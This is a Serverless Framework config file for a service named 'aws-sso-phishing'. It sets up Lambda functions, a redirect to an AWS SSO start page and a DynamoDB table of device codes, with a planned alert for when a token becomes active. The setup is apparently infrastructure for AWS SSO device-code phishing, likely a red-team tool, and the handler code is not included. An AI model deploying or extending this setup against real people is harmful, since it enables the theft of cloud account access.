# Welcome to Serverless!
#
# This file is the main config file for your service.
# It's very minimal at this point and uses default values.
# You can always add more config options for more control.
# We've included some commented out config examples here.
# Just uncomment any of them to get that config option.
#
# For full config options, check the docs:
#    docs.serverless.com
#
# Happy Coding!

service: aws-sso-phishing
# app and org for use with dashboard.serverless.com
app: aws-sso-phishing
#org: your-org-name

# You can pin your service to only deploy with a specific Serverless version
# Check out our docs for more details
frameworkVersion: '2'

provider:
  name: aws
  runtime: python3.8
  lambdaHashingVersion: 20201221

  iam:
    role:
      statements:
        - Effect: "Allow"
          Action:
            - "dynamodb:PutItem"
            - "dynamodb:GetItem"
          Resource:
            - "*"

package:
  individually: true

functions:

  poller:
    handler: functions/poller/handler.main
    package:
      exclude:
        - ./**
      include:
        - functions/poller/handler.py
    # ADD CLOUD WATCH EVENT

  urlRedirect:
    handler: functions/urlRedirect/handler.main
    environment:
      START_URL: "https://ruse.awsapps.com/start"
      REGION: "us-west-2"
    package:
      exclude:
        - ./**
      include:
        - functions/urlRedirect/handler.py
    events:
      - http: get redirect/



resources: # CloudFormation template syntax from here on.
  Resources:

    # Create DynamoDB
    usersTable:
      Type: AWS::DynamoDB::Table
      Properties:
        TableName: sessionTable
        AttributeDefinitions:
          - AttributeName: deviceCode
            AttributeType: S
        KeySchema:
          - AttributeName: deviceCode
            KeyType: HASH
        ProvisionedThroughput:
          ReadCapacityUnits: 1
          WriteCapacityUnits: 1

    # Create SNS Topic
    #
    # FIGURE OUT HOW TO ADD AN EMAIL TO THIS TEMPALTE
    #
    # TokenAlert:
    #     Type: AWS::SNS::Topic
    #     Properties:
    #     DisplayName: 'Send message when token becomes active'
    #     TopicName: TokenAlert


#    The following are a few example events you can configure
#    NOTE: Please make sure to change your handler code to work with those events
#    Check the event documentation for details
#    events:
#      - httpApi:
#          path: /users/create
#          method: get
#      - websocket: $connect
#      - s3: ${env:BUCKET}
#      - schedule: rate(10 minutes)
#      - sns: greeter-topic
#      - stream: arn:aws:dynamodb:region:XXXXXX:table/foo/stream/1970-01-01T00:00:00.000
#      - iot:
#          sql: "SELECT * FROM 'some_topic'"
#      - cloudwatchEvent:
#          event:
#            source:
#              - "aws.ec2"
#            detail-type:
#              - "EC2 Instance State-change Notification"
#            detail:
#              state:
#                - pending


